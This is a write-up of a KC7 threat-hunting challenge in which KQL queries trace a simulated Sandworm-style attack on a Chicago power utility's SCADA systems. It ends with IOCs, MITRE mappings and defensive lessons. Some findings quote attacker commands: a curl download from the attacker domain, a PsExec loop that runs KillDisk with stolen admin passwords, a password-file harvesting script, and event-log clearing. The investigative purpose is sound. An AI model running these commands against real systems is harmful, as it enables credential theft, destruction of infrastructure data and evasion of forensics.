# Critical Compromise in Chicago - ICS

A sophisticated nation-state cyberattack against SCADA systems and critical infrastructure, featuring multi-stage phishing, BlackEnergy malware deployment, credential theft, lateral movement via PsExec, and destructive KillDisk wiper attacks targeting Chicago's power grid.

![Difficulty](hxxps://img.shields[.]io/badge/Difficulty-Moderate-yellow?style=flat-square) ![Platform](hxxps://img.shields[.]io/badge/Platform-KC7-blue?style=flat-square) ![Category](hxxps://img.shields[.]io/badge/Category-ICS/SCADA%20Security-purple?style=flat-square)

---

## Challenge Overview

| **Field** | **Details** |
|-----------|-------------|
| **Challenge Name** | Critical Compromise in Chicago - ICS |
| **Author** | David Brown |
| **Platform** | KC7 Cybersecurity Game |
| **Category** | ICS/SCADA Security, Threat Hunting, Malware Analysis |
| **Difficulty** | Moderate |
| **Tools Used** | KQL (Kusto Query Language), Azure Data Explorer |
| **Target/Box** | ChicagoPower SCADA Environment |

**Scenario:** A massive power outage has disrupted Chicago, including a premier cybersecurity conference. Investigation reveals a sophisticated cyberattack targeting the city's SCADA systems, modeled after real-world power grid attacks. You'll trace a multi-stage phishing campaign that delivered BlackEnergy malware to a SCADA operator, follow the attacker's reconnaissance and credential theft activities, track lateral movement using PsExec, and identify the deployment of KillDisk destructive malware that wiped systems and shut down the power grid. The attack chain mirrors techniques used by APT44/Sandworm, the threat actor behind the 2015 Ukraine power grid attack.

---

## Attack Timeline

| **Date/Time** | **Event** |
|---------------|-----------|
| 2024-08-27T08:31:28Z | Attacker conducted reconnaissance on chicagopowergrid[.]com, browsing corporate events |
| 2024-08-29T03:27:11Z | First nltest domain controller enumeration observed (joeisenman account) |
| 2024-08-29T08:28:01Z | User jisaetang downloaded Urgent_Cyber_Threat_Alert[.]zip from chicagogridupdates[.]com |
| 2024-08-29T08:28:07Z | Malicious ZIP file created in Downloads folder |
| 2024-08-29T08:28:44Z | User opened ZIP file via Explorer[.]exe |
| 2024-08-29T08:28:45Z | BlackEnergy[.]exe created in C:\ProgramData\ (first observed execution) |
| 2024-08-29T08:49:45Z | BlackEnergy[.]exe established C2 beacon to chicagogridupdates[.]com, began network scanning |
| 2024-08-29T11:02:49Z | nltest domain controller enumeration from jisaetang account |
| 2024-09-02T06:52:05Z | Continued domain enumeration activity (ratyler account) |
| 2024-09-05T03:51:19Z | Latest domain enumeration observed (altorres account) |
| 2024-09-08T10:12:24Z | First curl command to download SCADA_Malicious_Commands.txt from chicagogridupdates[.]com |
| 2024-09-09T11:17:44Z | ICSScanner[.]exe executed to scan network 192.168.0[.]0/16 for SCADA systems |
| 2024-09-10T03:43:57Z | Second curl command downloading malicious commands |
| 2024-09-10T04:01:57Z | PsExec lateral movement began using extracted administrator credentials |
| 2024-09-10T04:08:57Z | Continued PsExec execution deploying BlackEnergy to SCADA hosts |
| 2024-09-10T04:41:57Z | KillDisk[.]exe deployed via PsExec with --all --wipe parameters |
| 2024-09-10T05:00:57Z | Event log clearing - Application log |
| 2024-09-10T05:25:57Z | Event log clearing - System log |
| 2024-09-10T05:32:57Z | Event log clearing - Security log |
| 2024-09-10T05:41:57Z | Scheduled task 'BackupTask' deleted |

---

## Solution Walkthrough

### Step 1 — Initial SCADA System Analysis

Began investigation by examining process activity related to SCADA systems to identify suspicious behavior.

```kql
ProcessEvents
| where process_commandline has "SCADA"
| count
```
// Result: 5 processes containing SCADA in command line

**Key findings:**
- **SCADA process count:** 5 unusual processes identified
- **Data source:** ProcessEvents table
- **Initial indicator:** Abnormal SCADA-related process execution

### Step 2 — Identifying SCADA Reconnaissance Tool

Located the executable used to scan for SCADA systems on the network.

```kql
ProcessEvents
| where process_commandline has "SCADA"
```
// Result: Found ICSScanner[.]exe spawned by blackenergy[.]exe

**Key findings:**
- **Malicious executable:** ICSScanner[.]exe
- **Parent process:** blackenergy[.]exe
- **Parent process hash:** 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2bb845
- **Command executed:** `C:\ProgramData\ICSScanner.exe ---scan ---network 192.168.0.0/16 --type SCADA --output C:\ProgramData\SCADA_IPs.txt`
- **Target network:** 192.168.0[.]0/16
- **Output file:** C:\ProgramData\SCADA_IPs.txt
- **Execution timestamp:** 2024-09-09T11:17:44Z

### Step 3 — Identifying Malicious File Download

Discovered external file downloaded from suspicious domain as part of the attack chain.

```kql
ProcessEvents
| where hostname == "BDC0-DESKTOP"
| where process_commandline contains "curl"
```
// Result: BlackEnergy spawned curl to download SCADA_Malicious_Commands.txt

**Key findings:**
- **Download command:** `curl -o C:\ProgramData\SCADA_Malicious_Commands.txt http://chicagogridupdates.com/SCADA_Malicious_Commands.txt`
- **Malicious domain:** chicagogridupdates[.]com
- **Parent process:** blackenergy[.]exe
- **Compromised host:** BDC0-DESKTOP
- **First download timestamp:** 2024-09-08T10:12:24Z

### Step 4 — Discovering Destructive Malware

Identified the wiper malware used to destroy SCADA systems.

```kql
ProcessEvents
| where hostname == "BDC0-DESKTOP"
| where process_commandline contains "wipe"
```
// Result: Found KillDisk[.]exe deployed via PsExec to multiple SCADA systems

**Key findings:**
- **Destructive tool:** KillDisk[.]exe
- **Deployment script:**
```batch
for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
  set /p password=<C:\\ProgramData\\Extracted_Password.txt
  psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\KillDisk.exe --all --wipe"
)
```
- **Execution method:** Automated deployment via PsExec loop
- **Credentials source:** Extracted_Password.txt
- **Target list:** SCADA_IPs.txt (output from ICSScanner)
- **Wipe parameters:** --all --wipe

### Step 5 — Identifying Lateral Movement Tool

Determined the legitimate Windows tool exploited for remote execution.

```kql
ProcessEvents
| where hostname == "BDC0-DESKTOP"
| where process_commandline contains "psexec"
```
// Result: psexec[.]exe used to deploy malware to multiple SCADA systems with admin credentials

**Key findings:**
- **Lateral movement tool:** psexec[.]exe (Windows Sysinternals)
- **Execution pattern:** Batch loop iterating through SCADA_IPs.txt
- **Credentials:** Administrator account with password from Extracted_Password.txt
- **Deployed payloads:** BlackEnergy[.]exe and SCADA_Malicious_Commands.txt

### Step 6 — Determining Persistence Mechanism

Identified the primary malware establishing persistence and performing reconnaissance.

```kql
ProcessEvents
| where hostname == "BDC0-DESKTOP"
| where process_commandline contains "psexec"
```
// Result: BlackEnergy[.]exe confirmed as persistence/reconnaissance tool

**Key findings:**
- **Persistence malware:** BlackEnergy[.]exe
- **Malware hash:** 1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81
- **First execution timestamp:** 2024-08-29T08:28:45Z
- **Reconnaissance capabilities:** Network scanning, SCADA discovery
- **C2 capabilities:** Beacon functionality with configurable intervals

### Step 7 — Threat Actor Attribution

Correlated attack patterns with known threat intelligence to identify responsible group.

**Analysis:** BlackEnergy malware, targeting critical infrastructure SCADA systems, and attack patterns match the 2015 Ukraine power grid attack

**Key findings:**
- **Threat actor:** APT44 / Sandworm / Seashell Blizzard
- **Known campaigns:** 2015 Ukraine power grid attack
- **Attack profile:** State-sponsored, critical infrastructure targeting
- **TTPs match:** BlackEnergy deployment, destructive attacks on ICS/SCADA

### Step 8 — Threat Hunting - First Malware Observation

Used threat hunting methodology to determine initial malware execution timestamp.

```kql
ProcessEvents
| where process_commandline contains "blackenergy"
```
// Result: First BlackEnergy execution on 2024-08-29T08:28:45Z

**Key findings:**
- **First observed timestamp:** 2024-08-29T08:28:45Z
- **Hostname:** BDC0-DESKTOP
- **Username:** jisaetang
- **Parent process:** Explorer[.]exe
- **Process hash:** 1624b5f54a285c08cacc24ddb7256ea082802f7934ccc142556c88800fb701ee
- **File path:** C:\ProgramData\BlackEnergy[.]exe

### Step 9 — Determining Malware Prevalence

Assessed how many hosts were compromised with BlackEnergy malware.

```kql
ProcessEvents
| where process_commandline contains "blackenergy"
| distinct hostname
```
// Result: BlackEnergy found only on BDC0-DESKTOP

**Key findings:**
- **Compromised hosts:** 1 (BDC0-DESKTOP only)
- **Scope:** Single initial compromise point
- **Investigation focus:** All malicious activity traced back to BDC0-DESKTOP

### Step 10 — Identifying Compromised Employee

Correlated the compromised hostname with employee records.

```kql
Employees
| where hostname == "BDC0-DESKTOP"
```
// Result: Host belongs to Jibby Saetang, SCADA Operator

**Key findings:**
- **Compromised employee:** Jibby Saetang
- **Username:** jisaetang
- **Role:** SCADA Operator
- **Email:** jibby_saetang@chicagopowergrid[.]com
- **IP address:** 10.10.0[.]8
- **Hire date:** 2022-02-16
- **User agent:** Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36

### Step 11 — Tracing Malware Download

Examined file creation events to identify the suspicious downloaded file.

```kql
let varName = datetime(2024-08-29);
FileCreationEvents
| where hostname contains "BDC0-DESKTOP"
| where timestamp >= varName
```
// Result: Urgent_Cyber_Threat_Alert.zip downloaded immediately before BlackEnergy execution

**Key findings:**
- **Malicious file:** Urgent_Cyber_Threat_Alert.zip
- **Download path:** C:\Users\jisaetang\Downloads\
- **Download timestamp:** 2024-08-29T08:28:07Z
- **Process:** firefox[.]exe
- **Temporal correlation:** Downloaded 38 seconds before BlackEnergy execution

### Step 12 — Identifying Download Source

Traced the network connection that delivered the malicious ZIP file.

```kql
OutboundNetworkEvents
| where url contains "zip" and url contains "threat"
```
// Result: File downloaded from chicagogridupdates[.]com

**Key findings:**
- **Download URL:** hxxp://chicagogridupdates[.]com/published/public/files/images/Urgent_Cyber_Threat_Alert.zip
- **Download timestamp:** 2024-08-29T08:28:01Z
- **Method:** GET
- **Source IP:** 10.10.0[.]8
- **Referrer:** (part of broader phishing campaign)
- **Status code:** 200

### Step 13 — Confirming BlackEnergy Creation

Verified BlackEnergy[.]exe was created immediately after ZIP file download.

```kql
FileCreationEvents
| where hostname == 'BDC0-DESKTOP'
| where timestamp >= datetime(2024-08-29T08:28:01Z)
| take 2
```
// Result: BlackEnergy[.]exe created 44 seconds after ZIP download

**Key findings:**
- **File created:** BlackEnergy[.]exe
- **Creation timestamp:** 2024-08-29T08:28:45Z
- **SHA256 hash:** 1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81
- **Path:** C:\ProgramData\BlackEnergy[.]exe
- **Created by:** explorer[.]exe (user extraction of ZIP)

### Step 14 — Analyzing User Interaction with ZIP

Examined process command lines to understand how user opened the malicious file.

```kql
ProcessEvents
| where process_commandline contains "blackenergy" or process_commandline contains "Urgent_Cyber_Threat_Alert.zip"
```
// Result: User opened ZIP via Explorer[.]exe double-click

**Key findings:**
- **User action:** Double-click in Windows Explorer
- **Command:** `Explorer.exe "C:\Users\jisaetang\Downloads\Urgent_Cyber_Threat_Alert.zip"`
- **Timestamp:** 2024-08-29T08:28:44Z
- **Result:** BlackEnergy[.]exe extracted and auto-executed from ZIP

### Step 15 — Identifying C2 Infrastructure

Located the command and control server BlackEnergy beaconed to after execution.

```kql
ProcessEvents
| where process_commandline contains "blackenergy" or process_commandline contains "Urgent_Cyber_Threat_Alert.zip"
```
// Result: BlackEnergy configured with C2 domain chicagogridupdates[.]com

**Key findings:**
- **C2 domain:** chicagogridupdates[.]com
- **Beacon command:** `BlackEnergy.exe --beacon-interval 10 --c2 chicagogridupdates.com --scan 192.168.1.0/24`
- **Beacon interval:** 10 seconds
- **Additional scanning:** 192.168.1[.]0/24 subnet
- **Execution timestamp:** 2024-08-29T08:49:45Z

### Step 16 — Analyzing Phishing Campaign

Investigated email records to identify the phishing sender targeting the most employees.

```kql
Email
| where sender !contains "@chicagopowergrid.com"
| distinct sender, recipient
| summarize TargetedEmployees = dcount(recipient) by sender
| sort by TargetedEmployees desc
| limit 10
```
// Result: thresher_libero@hotmail[.]com sent phishing emails to 5 employees

**Key findings:**
- **Primary phishing sender:** thresher_libero@hotmail[.]com (5 employees targeted)
- **Other senders identified:**
  - matthewlagarde@hotmail[.]com (10 employees)
  - barbaratrowbridge@hotmail[.]com (6 employees)
  - amphetamine.inboard@aol[.]com (5 employees)
  - jessiecodner@protonmail[.]com (5 employees)

### Step 17 — Identifying Attacker Infrastructure

Located the threat actor IP used for the most successful account compromises.

```kql
AuthenticationEvents
| where src_ip !contains "10.0."
| where result contains "success"
| distinct hostname, src_ip
| summarize controlled_hosts = dcount(hostname) by src_ip
| sort by controlled_hosts desc
```
// Result: IP 87.250.252[.]242 successfully authenticated to 4 hosts

**Key findings:**
- **Attacker IP:** 87.250.252[.]242
- **Compromised hosts:** 4 unique systems
- **Authentication method:** Successful credential-based logins
- **Pattern:** Lateral movement after initial compromise

### Step 18 — Reconnaissance of SCADA Operators

Discovered attacker reconnaissance targeting SCADA personnel.

```kql
InboundNetworkEvents
| where url contains "scada" and url contains "operator"
```
// Result: Attacker searched for two SCADA operators but only targeted Jibby Saetang

**Key findings:**
- **Reconnaissance URLs:**
  - hxxps://chicagopowergrid[.]com/search%3DJibby%2BSaetang
  - hxxps://chicagopowergrid[.]com/search%3DWade%2BWells%2BSCADA%2BOperator
- **Operators researched:** Jibby Saetang, Wade Wells
- **Targeted operator:** Jibby Saetang (received phishing)
- **Non-targeted operator:** Wade Wells

### Step 19 — Domain Controller Enumeration

Identified active directory reconnaissance performed by the attacker.

```kql
ProcessEvents
| where process_commandline has_any (
    "Get-ADDomainController",
    "Get-ADComputer",
    "Get-ADUser",
    "dsquery server",
    "nltest /dclist",
    "net group \"Domain Controllers\"",
    "Domain Controller",
    "/domain_"
)
| distinct username, process_commandline, timestamp, parent_process_name
| sort by timestamp desc
```
// Result: nltest /dclist:chicagogrid.local executed from 8 compromised accounts

**Key findings:**
- **Enumeration command:** `nltest /dclist:chicagogrid.local`
- **Compromised accounts:** altorres, jefoley, ratyler, stmcgrath, kajackson, jisaetang, elnunmaker, joeisenman
- **First enumeration:** 2024-08-29T03:27:11Z (joeisenman)
- **Latest enumeration:** 2024-09-05T03:51:19Z (altorres)
- **Domain:** chicagogrid.local

### Step 20 — Password File Search

Located the attacker's password file collection activity.

```kql
ProcessEvents
| where process_commandline has_any ("password")
| distinct username, process_commandline, timestamp, parent_process_name
| sort by timestamp desc
```
// Result: Attacker searched for password files and stored results

**Key findings:**
- **Search command:** `dir /s /b C:\*password*.txt > C:\ProgramData\Password_Files.txt`
- **Output file:** C:\ProgramData\Password_Files.txt
- **Extraction script:**
```batch
for /F 'tokens=1,2 delims=:' %i in (C:\ProgramData\Password_Files.txt) do findstr /i /M /C:"password" %j >> C:\ProgramData\Extracted_Password.txt
```
- **Extracted credentials:** C:\ProgramData\Extracted_Password.txt
- **Usage:** Credentials used in PsExec lateral movement

### Step 21 — Social Engineering Reconnaissance

Identified corporate event the attacker researched for social engineering context.

```kql
InboundNetworkEvents
| where url contains "event" and url contains "chicagopowergrid.com" and url contains "upcoming"
```
// Result: Attacker browsed karaoke night event details for phishing context

**Key findings:**
- **Event targeted:** Karaoke night
- **URL browsed:** hxxps://chicagopowergrid[.]com/events/upcoming-corporate-karaoke-night/
- **Timestamp:** 2024-08-27T08:31:28Z
- **Attacker IP:** 104.244.42[.]129
- **Referrer:** hxxps://www[.]supernicehackerbros[.]com
- **Purpose:** Social engineering context for phishing lure

### Step 22 — Anti-Forensics - Event Log Clearing

Discovered attacker's attempt to hide tracks by clearing Windows event logs.

```kql
ProcessEvents
| where process_commandline has_any ("wevtutil ", "delete", "Wipe")
| project timestamp, username, hostname, process_commandline
```
// Result: Attacker cleared System, Application, and Security event logs

**Key findings:**
- **Log clearing commands:**
  - `wevtutil cl System`
  - `wevtutil cl Application`
  - `wevtutil cl Security`
- **Scheduled task deletion:** `schtasks /delete /tn 'BackupTask' /f`
- **Timestamp range:** 2024-09-10 05:00:57Z - 05:41:57Z
- **Username:** jisaetang
- **Hostname:** BDC0-DESKTOP

### Step 23 — Identifying Final Victim

Determined which compromised employee account sent the final phishing email.

```kql
let test_ip =
OutboundNetworkEvents
| where url contains "http://citygridsolutions.net/search/images/published/login.html"
| distinct src_ip;

Employees
| where ip_addr in (test_ip)
| distinct name
```
// Result: Joseph Eisenman's compromised account used to send phishing to final victim

**Key findings:**
- **Compromised sender:** Joseph Eisenman
- **Phishing URL in email:** hxxp://citygridsolutions[.]net/search/images/published/login.html
- **Source IP correlation:** Matched outbound network events to employee IP
- **Attack stage:** Secondary phishing from compromised internal account

---

## IOC Table

| **Type** | **Indicator** | **Context** | **Threat Actor** |
|----------|--------------|-------------|------------------|
| Domain | chicagogridupdates[.]com | C2 server, malicious file hosting | APT44/Sandworm |
| Domain | citygridsolutions[.]net | Phishing URL in secondary attack | APT44/Sandworm |
| Domain | supernicehackerbros[.]com | Referrer during reconnaissance | APT44/Sandworm |
| Email | thresher_libero@hotmail[.]com | Phishing sender (5 targets) | APT44/Sandworm |
| Email | matthewlagarde@hotmail[.]com | Phishing sender (10 targets) | APT44/Sandworm |
| Email | barbaratrowbridge@hotmail[.]com | Phishing sender (6 targets) | APT44/Sandworm |
| Email | amphetamine.inboard@aol[.]com | Phishing sender (5 targets) | APT44/Sandworm |
| Email | jessiecodner@protonmail[.]com | Phishing sender (5 targets) | APT44/Sandworm |
| IPv4 | 87[.]250[.]252[.]242 | Attacker infrastructure, 4 hosts compromised | APT44/Sandworm |
| IPv4 | 104[.]244[.]42[.]129 | Reconnaissance source IP | APT44/Sandworm |
| IPv4 | 10[.]10[.]0[.]8 | Compromised internal host (BDC0-DESKTOP) | Victim |
| Network | 192[.]168[.]0[.]0/16 | SCADA network scan target | Target network |
| Network | 192[.]168[.]1[.]0/24 | Secondary network scan target | Target network |
| File Hash (SHA256) | 1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81 | BlackEnergy[.]exe | APT44/Sandworm |
| File Hash (SHA256) | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2bb845 | blackenergy[.]exe (parent process) | APT44/Sandworm |
| File Hash (SHA256) | 47aa330465442d826b2a159ca639b189239b793f466d995c | Urgent_Cyber_Threat_Alert.zip | APT44/Sandworm |
| Filename | BlackEnergy[.]exe | Primary malware, persistence/recon | APT44/Sandworm |
| Filename | ICSScanner[.]exe | SCADA network scanning tool | APT44/Sandworm |
| Filename | KillDisk[.]exe | Destructive wiper malware | APT44/Sandworm |
| Filename | Urgent_Cyber_Threat_Alert.zip | Phishing attachment delivery | APT44/Sandworm |
| File Path | C:\ProgramData\SCADA_IPs.txt | SCADA host list output | Attack artifact |
| File Path | C:\ProgramData\Password_Files.txt | Password file search results | Attack artifact |
| File Path | C:\ProgramData\Extracted_Password.txt | Extracted admin credentials | Attack artifact |
| File Path | C:\ProgramData\SCADA_Malicious_Commands.txt | Downloaded command script | Attack artifact |
| Username | jisaetang | Compromised SCADA operator | Initial victim |
| Username | joeisenman | Compromised account, phishing sender | Secondary victim |
| Hostname | BDC0-DESKTOP | Initial compromise point | Victim host |

---

## MITRE ATT&CK Mapping

| **Tactic** | **Technique ID** | **Technique Name** | **Evidence from Investigation** |
|------------|-----------------|-------------------|--------------------------------|
| Reconnaissance | T1593.002 | Search Victim-Owned Websites | Attacker browsed chicagopowergrid[.]com for SCADA operators and corporate events |
| Resource Development | T1583.001 | Acquire Infrastructure: Domains | Registered chicagogridupdates[.]com for C2 and file hosting |
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | Urgent_Cyber_Threat_Alert.zip delivered via targeted phishing |
| Initial Access | T1078 | Valid Accounts | Compromised 8 accounts including jisaetang, joeisenman for lateral movement |
| Execution | T1204.002 | User Execution: Malicious File | User jisaetang opened ZIP file, extracted and ran BlackEnergy[.]exe |
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Used cmd[.]exe for batch scripts, PsExec deployment |
| Persistence | T1543.003 | Create or Modify System Process: Windows Service | BlackEnergy[.]exe established persistence mechanism |
| Discovery | T1018 | Remote System Discovery | nltest /dclist:chicagogrid.local executed on 8 compromised accounts |
| Discovery | T1046 | Network Service Scanning | ICSScanner[.]exe scanned 192.168.0[.]0/16 for SCADA systems |
| Discovery | T1083 | File and Directory Discovery | dir /s /b C:\*password*.txt searched filesystem for password files |
| Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files | Extracted passwords from text files, stored in Extracted_Password.txt |
| Lateral Movement | T1570 | Lateral Tool Transfer | BlackEnergy[.]exe and KillDisk[.]exe transferred to SCADA systems via PsExec |
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | PsExec used with administrator credentials for remote execution |
| Collection | T1119 | Automated Collection | Batch script automated collection of SCADA IPs and password files |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | BlackEnergy beaconed to chicagogridupdates[.]com every 10 seconds |
| Command and Control | T1105 | Ingress Tool Transfer | curl downloaded SCADA_Malicious_Commands.txt from C2 server |
| Impact | T1485 | Data Destruction | KillDisk[.]exe --all --wipe destroyed data on SCADA systems |
| Impact | T1489 | Service Stop | Power grid SCADA services shut down by destructive malware |
| Defense Evasion | T1070.001 | Indicator Removal: Clear Windows Event Logs | wevtutil cl System/Application/Security cleared forensic evidence |
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | schtasks /delete removed BackupTask scheduled task |

---

## Tools Used

- **KQL (Kusto Query Language)** — Primary query language for investigating ProcessEvents, FileCreationEvents, OutboundNetworkEvents, InboundNetworkEvents, Email, AuthenticationEvents, and Employees tables
- **Azure Data Explorer** — Data analysis platform hosting ChicagoPower SCADA environment logs
- **BlackEnergy malware (adversary tool)** — ICS/SCADA-targeted malware used for persistence, reconnaissance, and C2
- **ICSScanner[.]exe (adversary tool)** — Custom tool used to scan for SCADA systems on network 192.168.0[.]0/16
- **PsExec (adversary abuse)** — Legitimate Windows Sysinternals tool abused for lateral movement with stolen administrator credentials
- **KillDisk wiper (adversary tool)** — Destructive malware deployed to wipe SCADA systems and cause power grid failure
- **curl (adversary tool)** — Used to download malicious commands from C2 server
- **nltest (adversary tool)** — Windows utility abused for domain controller enumeration
- **wevtutil (adversary tool)** — Windows utility abused to clear System, Application, and Security event logs

---

## Key Takeaways

1. **Multi-stage phishing campaigns require layered defenses** — The attacker conducted reconnaissance on specific SCADA operators and corporate events before crafting targeted phishing lures. Email security solutions must analyze sender reputation, attachment sandboxing, and user awareness training to detect social engineering attempts. The ZIP file (Urgent_Cyber_Threat_Alert.zip) should have been flagged at the email gateway.

2. **User execution remains the weakest link in ICS environments** — Despite security controls, jisaetang opened the malicious ZIP file and extracted BlackEnergy[.]exe. SCADA operators require specialized security awareness training on ICS-specific threats. Application whitelisting and controlled execution policies could have prevented BlackEnergy from running in C:\ProgramData\.

3. **Credential theft from text files enables catastrophic lateral movement** — The attacker's discovery of passwords stored in plaintext files (Password_Files.txt, Extracted_Password.txt) allowed PsExec-based lateral movement to all SCADA systems. Organizations must enforce password managers, eliminate credentials in files, and detect "dir /s *password*.txt" commands as high-severity indicators.

4. **PsExec abuse is a critical lateral movement vector** — Legitimate administrative tools like PsExec, when combined with stolen credentials, allow rapid deployment of malware across environments. EDR solutions must baseline normal PsExec usage patterns and alert on anomalous remote execution, especially to OT/ICS subnets. Network segmentation could have limited the blast radius.

5. **Destructive malware against ICS requires specialized detection** — KillDisk's deployment via automated batch scripts (iterating through SCADA_IPs.txt) shows the need for OT-specific threat hunting. Monitoring for commands containing "--wipe", "--all", and remote execution to SCADA assets provides critical early warning. ICS environments need air-gapped backups and recovery procedures